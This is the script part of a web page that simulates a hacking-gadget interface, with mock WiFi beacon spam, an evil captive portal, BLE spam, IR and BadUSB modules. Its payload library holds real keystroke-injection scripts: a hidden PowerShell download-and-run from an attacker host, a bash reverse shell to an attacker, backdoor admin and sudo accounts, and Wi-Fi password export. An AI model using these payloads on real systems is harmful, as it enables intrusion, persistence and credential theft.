                android: ['Galaxy Buds Pro', 'Pixel Buds', 'OnePlus Buds'],
                windows: ['Xbox Controller', 'Surface Pen', 'Arc Mouse'],
                all: ['AirPods Pro', 'Galaxy Buds', 'Xbox Controller', 'AirTag']
            };
            
            let packets = 0;
            const speed = 200 / UI.settings.simSpeed;
            this.intervals.ble = setInterval(() => {
                if (!this.state.bleRunning) return;
                const dev = devices[target][Math.floor(Math.random() * devices[target].length)];
                const pktCount = Math.floor(Math.random() * 10) + 5;
                packets += pktCount;
                Stats.increment('bleSpamPackets', pktCount);
                document.getElementById('ble-packets').textContent = packets;
                document.getElementById('ble-rate').textContent = Math.floor(Math.random() * 50) + 150;
                this.log('ble-screen', `TX: "${dev}" advertisement`);
            }, speed);
        },

        bleStop() {
            this.state.bleRunning = false;
            clearInterval(this.intervals.ble);
            this.setStatus('ble-status', 'ready', 'STOPPED');
            this.log('ble-screen', 'Spam stopped.', 'warn');
        },

        // === BadUSB Module ===
        badusbLoad() {
            UI.initPayloadLibrary();
            UI.openModal('payloadModal');
        },

        badusbRun() {
            const payload = document.getElementById('badusb-payload').value;
            if (!payload.trim()) {
                this.log('badusb-screen', 'No payload entered!', 'error');
                UI.toast('Error', 'Enter a payload first', 'error');
                return;
            }
            
            const lines = payload.split('\n').filter(l => l.trim() && !l.startsWith('REM'));
            this.state.badusbRunning = true;
            this.setStatus('badusb-status', 'running', 'EXECUTING');
            this.log('badusb-screen', 'Executing payload...', 'warn');
            UI.toast('BadUSB', 'Executing payload...', 'warning');
            
            let idx = 0;
            const progress = document.getElementById('badusb-progress');
            const speed = 500 / UI.settings.simSpeed;
            
            this.intervals.badusb = setInterval(() => {
                if (!this.state.badusbRunning || idx >= lines.length) {
                    clearInterval(this.intervals.badusb);
                    progress.style.width = '100%';
                    this.setStatus('badusb-status', 'ready', 'COMPLETE');
                    this.log('badusb-screen', 'Payload execution complete!', 'info');
                    Stats.increment('payloadsExecuted');
                    UI.toast('Complete', 'Payload executed successfully', 'success');
                    return;
                }
                
                const line = lines[idx].trim();
                progress.style.width = ((idx + 1) / lines.length * 100) + '%';
                
                if (line.startsWith('DELAY')) {
                    this.log('badusb-screen', `DELAY ${line.split(' ')[1]}ms`);
                } else if (line.startsWith('STRING')) {
                    this.log('badusb-screen', `TYPE: "${line.substring(7)}"`);
                } else if (line.startsWith('GUI') || line.startsWith('CTRL') || line.startsWith('ALT')) {
                    this.log('badusb-screen', `KEY: ${line}`);
                } else {
                    this.log('badusb-screen', `CMD: ${line}`);
                }
                idx++;
            }, speed);
        },

        badusbStop() {
            this.state.badusbRunning = false;
            clearInterval(this.intervals.badusb);
            this.setStatus('badusb-status', 'error', 'ABORTED');
            this.log('badusb-screen', 'Execution aborted!', 'error');
        },

        // === IR Module ===
        irReceive() {
            this.setStatus('ir-status', 'running', 'LISTENING');
            this.log('ir-screen', 'Waiting for IR signal...', 'info');
            UI.toast('IR Receive', 'Point remote at device', 'info');
            
            const delay = 2000 / UI.settings.simSpeed;
            setTimeout(() => {
                const protocol = document.getElementById('ir-protocol').value.toUpperCase();
                this.setStatus('ir-status', 'ready', 'CAPTURED');
                this.log('ir-screen', `Signal captured! Protocol: ${protocol}`);
                this.log('ir-screen', 'Address: 0x04 Command: 0x08');
                Stats.increment('irSignals');
                const count = parseInt(document.getElementById('ir-signals').textContent) + 1;
                document.getElementById('ir-signals').textContent = count;
                UI.toast('IR Captured', `${protocol} signal saved`, 'success');
            }, delay);
        },

        irTvBGone() {
            this.setStatus('ir-status', 'running', 'CYCLING');
            this.log('ir-screen', 'Starting TV-B-Gone cycle...', 'warn');
            UI.toast('TV-B-Gone', 'Cycling power codes...', 'warning');
            
            const brands = ['Samsung', 'LG', 'Sony', 'Vizio', 'TCL', 'Hisense', 'Panasonic', 'Sharp'];
            let idx = 0;
            const speed = 400 / UI.settings.simSpeed;
            
            this.intervals.ir = setInterval(() => {
                if (idx >= brands.length) {
                    clearInterval(this.intervals.ir);
                    this.setStatus('ir-status', 'ready', 'COMPLETE');
                    this.log('ir-screen', 'Cycle complete. 230 codes transmitted.', 'info');
                    Stats.increment('irSignals', 230);
                    UI.toast('Complete', '230 IR codes transmitted', 'success');
                    return;
                }
                this.log('ir-screen', `TX: ${brands[idx]} power code...`);
                idx++;
            }, speed);
        },

        irTransmit() {
            this.log('ir-screen', 'Transmitting last captured signal...', 'info');
            setTimeout(() => {
                this.log('ir-screen', 'Signal transmitted successfully!');
            }, 500);
        },

        // === Quick Actions ===
        quickAction(action) {
            const actions = {
                beacon: () => {
                    this.log('wifi-screen', 'Starting Beacon Spam...', 'warn');
                    this.setStatus('wifi-status', 'running', 'SPAMMING');
                    UI.toast('Beacon Spam', 'Flooding with fake SSIDs', 'warning');
                    let count = 0;
                    const speed = 200 / UI.settings.simSpeed;
                    this.intervals.beacon = setInterval(() => {
                        count++;
                        Stats.increment('packetsTransmitted');
                        this.log('wifi-screen', `TX Beacon #${count}: "FreeWiFi_${Math.random().toString(36).substr(2,5)}"`);
                        if (count > 15) { 
                            clearInterval(this.intervals.beacon); 
                            this.setStatus('wifi-status', 'ready', 'READY');
                            UI.toast('Complete', `${count} beacons transmitted`, 'success');
                        }
                    }, speed);
                },
                portal: () => {
                    this.log('wifi-screen', 'Deploying Evil Portal...', 'warn');
                    this.setStatus('wifi-status', 'running', 'PORTAL');
                    UI.toast('Evil Portal', 'Captive portal active', 'warning');
                    setTimeout(() => {
                        this.log('wifi-screen', 'AP "Free_Coffee_WiFi" active', 'info');
                        this.log('wifi-screen', 'Portal: Google login template');
                        this.log('wifi-screen', 'Waiting for victims...');
                        
                        // Simulate credential capture
                        setTimeout(() => {
                            this.log('wifi-screen', '‚òÖ CREDENTIAL CAPTURED! ‚òÖ', 'info');
                            const emails = ['john.doe@email.com', 'jane.smith@company.org', 'user123@gmail.com'];
                            const email = emails[Math.floor(Math.random() * emails.length)];
                            Stats.addCredential('Google Login', email, 'P@ssw0rd' + Math.floor(Math.random() * 1000));
                        }, 3000 / UI.settings.simSpeed);
                    }, 1000 / UI.settings.simSpeed);
                },
                subghz: () => {
                    this.log('ir-screen', 'Sub-GHz scan requires CC1101 module', 'warn');
                    this.log('ir-screen', 'Simulating 433.92MHz scan...', 'info');
                    UI.toast('Sub-GHz', 'Scanning 433.92MHz', 'info');
                    setTimeout(() => {
                        this.log('ir-screen', 'Signal detected! Garage door remote');
                        this.log('ir-screen', 'Protocol: Princeton 24-bit');
                        UI.toast('Signal Found', 'Garage door remote captured', 'success');
                    }, 1500 / UI.settings.simSpeed);
                },
                gps: () => {
                    this.log('wifi-screen', 'GPS Wardriving mode...', 'info');
                    this.log('wifi-screen', 'Acquiring satellite fix...');
                    UI.toast('GPS', 'Acquiring satellite fix...', 'info');
                    setTimeout(() => {
                        this.log('wifi-screen', 'GPS Lock: 37.7749¬∞N, 122.4194¬∞W', 'info');
                        this.log('wifi-screen', 'Satellites: 8 ‚Ä¢ HDOP: 1.2');
                        this.log('wifi-screen', 'Logging networks with coordinates...');
                        UI.toast('GPS Lock', '8 satellites acquired', 'success');
                    }, 2000 / UI.settings.simSpeed);
                },
                badble: () => {
                    this.log('ble-screen', 'BadBLE HID mode activated', 'warn');
                    this.log('ble-screen', 'Advertising as "Logitech Keyboard"...');
                    this.setStatus('ble-status', 'running', 'ADVERTISING');
                    UI.toast('BadBLE', 'Advertising as HID keyboard', 'warning');
                    setTimeout(() => {
                        this.log('ble-screen', 'Device paired! Executing payload...', 'info');
                        UI.toast('Paired', 'Target connected, injecting...', 'success');
                    }, 3000 / UI.settings.simSpeed);
                },
                jammer: () => {
                    this.log('ble-screen', '‚ö†Ô∏è 2.4GHz Jammer - SIMULATION ONLY', 'error');
                    this.log('ble-screen', 'Real jamming is ILLEGAL!', 'warn');
                    this.log('ble-screen', 'Would flood channels 1-14...');
                    UI.toast('Warning', 'Jamming is illegal - simulation only', 'error');
                },
                viewCreds: () => {
                    UI.showCredentials();
                },
                viewStats: () => {
                    this.showStats();
                }
            };
            
            if (actions[action]) actions[action]();
        },
        
        showStats() {
            const s = Stats.data;
            const content = `
                <div class="stats-row">
                    <div class="stat-card"><div class="stat-icon">üì°</div><div class="stat-num">${s.networksScanned}</div><div class="stat-label">Networks</div></div>
                    <div class="stat-card"><div class="stat-icon">üîê</div><div class="stat-num">${s.handshakesCaptured}</div><div class="stat-label">Handshakes</div></div>
                    <div class="stat-card"><div class="stat-icon">üì¶</div><div class="stat-num">${s.packetsTransmitted}</div><div class="stat-label">Packets TX</div></div>
                    <div class="stat-card"><div class="stat-icon">‚è±Ô∏è</div><div class="stat-num">${Stats.getSessionTime()}</div><div class="stat-label">Session</div></div>
                </div>
                <div class="stats-row">
                    <div class="stat-card"><div class="stat-icon">üì∂</div><div class="stat-num">${s.bleSpamPackets}</div><div class="stat-label">BLE Packets</div></div>
                    <div class="stat-card"><div class="stat-icon">üì∫</div><div class="stat-num">${s.irSignals}</div><div class="stat-label">IR Signals</div></div>
                    <div class="stat-card"><div class="stat-icon">‚å®Ô∏è</div><div class="stat-num">${s.payloadsExecuted}</div><div class="stat-label">Payloads</div></div>
                    <div class="stat-card"><div class="stat-icon">üé£</div><div class="stat-num">${Stats.credentials.length}</div><div class="stat-label">Credentials</div></div>
                </div>
            `;
            UI.toast('Session Stats', `${s.networksScanned} networks, ${s.handshakesCaptured} handshakes`, 'info');
        }
    };

    // --- UI SYSTEM ---
    const UI = {
        settings: {
            theme: 'dark',
            sound: true,
            animations: true,
            autoScroll: true,
            simSpeed: 1
        },
        
        init() {
            this.loadSettings();
            this.initKeyboardShortcuts();
            this.initPayloadLibrary();
        },
        
        // Toast Notifications
        toast(title, msg, type = 'info') {
            const container = document.getElementById('toastContainer');
            const icons = { success: '‚úÖ', error: '‚ùå', info: '‚ÑπÔ∏è', warning: '‚ö†Ô∏è' };
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `
                <span class="toast-icon">${icons[type]}</span>
                <div class="toast-content">
                    <div class="toast-title">${title}</div>
                    <div class="toast-msg">${msg}</div>
                </div>
            `;
            container.appendChild(toast);
            if (this.settings.sound) this.playSound(type);
            setTimeout(() => {
                toast.classList.add('removing');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        },
        
        // Sound Effects
        playSound(type) {
            if (!this.settings.sound) return;
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain);
            gain.connect(ctx.destination);
            gain.gain.value = 0.1;
            const freqs = { success: 880, error: 220, info: 440, warning: 330, click: 660 };
            osc.frequency.value = freqs[type] || 440;
            osc.start();
            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.2);
            osc.stop(ctx.currentTime + 0.2);
        },
        
        // Modal System
        openModal(id) {
            document.getElementById(id)?.classList.add('active');
            if (this.settings.sound) this.playSound('click');
        },
        
        closeModal(id) {
            document.getElementById(id)?.classList.remove('active');
        },
        
        closeAllModals() {
            document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
        },
        
        // Theme Toggle
        toggleTheme() {
            this.settings.theme = this.settings.theme === 'dark' ? 'light' : 'dark';
            document.documentElement.setAttribute('data-theme', this.settings.theme);
            document.getElementById('toggleTheme')?.classList.toggle('active', this.settings.theme === 'dark');
            this.saveSettings();
            this.toast('Theme Changed', `Switched to ${this.settings.theme} mode`, 'info');
        },
        
        // Settings Toggle
        toggleSetting(key) {
            this.settings[key] = !this.settings[key];
            const toggleId = 'toggle' + key.charAt(0).toUpperCase() + key.slice(1);
            document.getElementById(toggleId)?.classList.toggle('active', this.settings[key]);
            this.saveSettings();
        },
        
        setSimSpeed(val) {
            this.settings.simSpeed = parseFloat(val);
            this.saveSettings();
        },
        
        // Persistence
        saveSettings() {
            try { localStorage.setItem('bruceSettings', JSON.stringify(this.settings)); } catch(e) {}
        },
        
        loadSettings() {
            try {
                const saved = localStorage.getItem('bruceSettings');
                if (saved) {
                    this.settings = { ...this.settings, ...JSON.parse(saved) };
                    document.documentElement.setAttribute('data-theme', this.settings.theme);
                    document.getElementById('toggleTheme')?.classList.toggle('active', this.settings.theme === 'dark');
                    document.getElementById('toggleSound')?.classList.toggle('active', this.settings.sound);
                    document.getElementById('toggleAnim')?.classList.toggle('active', this.settings.animations);
                    document.getElementById('simSpeed')?.setAttribute('value', this.settings.simSpeed);
                }
            } catch(e) {}
        },
        
        // Keyboard Shortcuts
        initKeyboardShortcuts() {
            document.addEventListener('keydown', e => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
                
                const shortcuts = {
                    'd': () => App.navigate('dashboard', document.querySelector('[data-tab="dashboard"]')),
                    'w': () => App.navigate('wifi', document.querySelector('[data-tab="wifi"]')),
                    'b': () => App.navigate('ble', document.querySelector('[data-tab="ble"]')),
                    'i': () => App.navigate('ir', document.querySelector('[data-tab="ir"]')),
                    'r': () => App.navigate('rf', document.querySelector('[data-tab="rf"]')),
                    'g': () => App.navigate('gps', document.querySelector('[data-tab="gps"]')),
                    't': () => App.navigate('tools', document.querySelector('[data-tab="tools"]')),
                    'h': () => App.navigate('help', document.querySelector('[data-tab="help"]')),
                    '/': () => document.getElementById('searchBox')?.focus(),
                    '?': () => this.openModal('shortcutsModal'),
                    'Escape': () => this.closeAllModals()
                };
                
                if (e.ctrlKey && e.key === ',') {
                    e.preventDefault();
                    this.openModal('settingsModal');
                } else if (shortcuts[e.key]) {
                    e.preventDefault();
                    shortcuts[e.key]();
                }
            });
        },
        
        // Payload Library
        payloads: [
            { id: 'win_rev', name: 'Reverse Shell', desc: 'PowerShell reverse connection', os: 'Windows', code: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass\nENTER\nDELAY 1000\nSTRING IEX(IWR "http://attacker/shell.ps1")\nENTER' },
            { id: 'win_admin', name: 'Add Admin User', desc: 'Create backdoor admin account', os: 'Windows', code: 'DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 1000\nALT y\nDELAY 500\nSTRING net user hacker P@ss123 /add\nENTER\nSTRING net localgroup administrators hacker /add\nENTER' },
            { id: 'win_wifi', name: 'Exfil Wi-Fi', desc: 'Extract saved Wi-Fi passwords', os: 'Windows', code: 'DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd /c "netsh wlan export profile key=clear"\nENTER' },
            { id: 'mac_term', name: 'Terminal Access', desc: 'Open terminal and execute', os: 'macOS', code: 'DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING whoami\nENTER' },
            { id: 'mac_rev', name: 'Bash Reverse', desc: 'Bash reverse shell', os: 'macOS', code: 'DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING bash -i >& /dev/tcp/attacker/4444 0>&1\nENTER' },
            { id: 'linux_user', name: 'Backdoor User', desc: 'Add sudo user', os: 'Linux', code: 'DELAY 1000\nCTRL ALT t\nDELAY 1000\nSTRING sudo useradd -m -G sudo backdoor\nENTER' },
            { id: 'rick', name: 'Rickroll', desc: 'Open YouTube rickroll', os: 'Any', code: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING https://youtu.be/dQw4w9WgXcQ\nENTER' },
            { id: 'lock', name: 'Lock Screen', desc: 'Lock the workstation', os: 'Windows', code: 'DELAY 500\nGUI l' }
        ],
        selectedPayload: null,
        
        initPayloadLibrary() {
            const grid = document.getElementById('payloadGrid');
            if (!grid) return;
            grid.innerHTML = this.payloads.map(p => `
                <div class="payload-item" data-id="${p.id}" onclick="UI.selectPayload('${p.id}')">
                    <div class="payload-name">${p.name}</div>
                    <div class="payload-desc">${p.desc}</div>
                    <div class="payload-os">${p.os}</div>
                </div>
            `).join('');
        },
        
        selectPayload(id) {
            this.selectedPayload = this.payloads.find(p => p.id === id);
            document.querySelectorAll('.payload-item').forEach(el => {
                el.classList.toggle('selected', el.dataset.id === id);
            });
        },
        
        loadSelectedPayload() {
            if (!this.selectedPayload) {
                this.toast('Error', 'No payload selected', 'error');
                return;
            }
            const textarea = document.getElementById('badusb-payload');
            if (textarea) textarea.value = this.selectedPayload.code;
            this.closeModal('payloadModal');
            this.toast('Payload Loaded', this.selectedPayload.name, 'success');
        },
        
        // Export/Import
        exportSession() {
            const data = {
                settings: this.settings,
                stats: Stats.data,
                credentials: Stats.credentials,
                timestamp: new Date().toISOString()
            };
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `bruce-session-${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
            this.toast('Exported', 'Session data downloaded', 'success');
        },
        
        clearAllData() {
            if (confirm('Clear all simulation data?')) {
                Stats.reset();
                Sim.clearAll();
                localStorage.removeItem('bruceSettings');
                this.toast('Cleared', 'All data reset', 'info');
            }
        },
        
        // Credentials
        showCredentials() {
            const content = document.getElementById('credsContent');
            if (!content) return;
            if (Stats.credentials.length === 0) {
                content.innerHTML = '<p style="color:var(--text-muted);text-align:center;">No credentials captured yet</p>';
            } else {
                content.innerHTML = Stats.credentials.map(c => `
                    <div class="cred-card">
                        <div class="cred-header">
                            <span class="cred-portal">${c.portal}</span>
                            <span class="cred-time">${c.time}</span>
                        </div>
                        <div class="cred-field"><span class="cred-label">Email:</span><span class="cred-value">${c.email}</span></div>
                        <div class="cred-field"><span class="cred-label">Password:</span><span class="cred-value">${c.password}</span></div>
                    </div>
                `).join('');
            }
            this.openModal('credsModal');
        },
        
        exportCreds() {
            const csv = 'Portal,Email,Password,Time\n' + Stats.credentials.map(c => 
                `"${c.portal}","${c.email}","${c.password}","${c.time}"`
            ).join('\n');
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'credentials.csv';
            a.click();
            this.toast('Exported', 'Credentials CSV downloaded', 'success');
        },
        
        clearCreds() {
            Stats.credentials = [];
            this.showCredentials();
            this.toast('Cleared', 'Credentials deleted', 'info');
        }
    };

    // --- STATISTICS TRACKER ---
    const Stats = {
        data: {
            networksScanned: 0,
            handshakesCaptured: 0,
            packetsTransmitted: 0,
            bleSpamPackets: 0,
            irSignals: 0,
            payloadsExecuted: 0,
            sessionStart: Date.now()
        },
        credentials: [],
        packetLog: [],
        signalHistory: [],
        
        increment(key, val = 1) {
            if (this.data[key] !== undefined) this.data[key] += val;
        },
        
        addPacket(type, data) {
            const time = new Date().toLocaleTimeString();
            this.packetLog.unshift({ time, type, data });
            if (this.packetLog.length > 100) this.packetLog.pop();
        },
        
        addCredential(portal, email, password) {
            this.credentials.push({
                portal,
                email,
                password,
                time: new Date().toLocaleString()
            });
            UI.toast('Credential Captured!', `${email} from ${portal}`, 'success');
        },
        
        addSignal(rssi) {
            this.signalHistory.push({ time: Date.now(), rssi });
            if (this.signalHistory.length > 50) this.signalHistory.shift();
        },
        
        reset() {
            this.data = {
                networksScanned: 0,
                handshakesCaptured: 0,
                packetsTransmitted: 0,
                bleSpamPackets: 0,
                irSignals: 0,
                payloadsExecuted: 0,
                sessionStart: Date.now()
            };
            this.credentials = [];
            this.packetLog = [];
            this.signalHistory = [];
        },
        
        getSessionTime() {
            const ms = Date.now() - this.data.sessionStart;
            const mins = Math.floor(ms / 60000);
            const secs = Math.floor((ms % 60000) / 1000);
            return `${mins}m ${secs}s`;
        }
    };

    // --- SIGNAL GRAPH ---
    const Graph = {
        canvas: null,
        ctx: null,
        
        init(canvasId) {
            this.canvas = document.getElementById(canvasId);
            if (!this.canvas) return;
            this.ctx = this.canvas.getContext('2d');
            this.canvas.width = this.canvas.offsetWidth;
            this.canvas.height = this.canvas.offsetHeight;
        },
        
        draw() {
            if (!this.ctx || Stats.signalHistory.length < 2) return;
            const { width, height } = this.canvas;
            this.ctx.clearRect(0, 0, width, height);
            
            // Grid
            this.ctx.strokeStyle = '#222';
            this.ctx.lineWidth = 1;
            for (let i = 0; i < 5; i++) {
                const y = (height / 5) * i;
                this.ctx.beginPath();
                this.ctx.moveTo(0, y);
                this.ctx.lineTo(width, y);
                this.ctx.stroke();
            }
            
            // Signal line
            this.ctx.strokeStyle = '#a855f7';
            this.ctx.lineWidth = 2;
            this.ctx.beginPath();
            
            const data = Stats.signalHistory;
            const step = width / (data.length - 1);
            
            data.forEach((point, i) => {
                const x = i * step;
                const y = height - ((point.rssi + 100) / 100 * height);
                if (i === 0) this.ctx.moveTo(x, y);
                else this.ctx.lineTo(x, y);
            });
            
            this.ctx.stroke();
        }
    };

    App.init();
    UI.init();
</script>

</body>
</html>
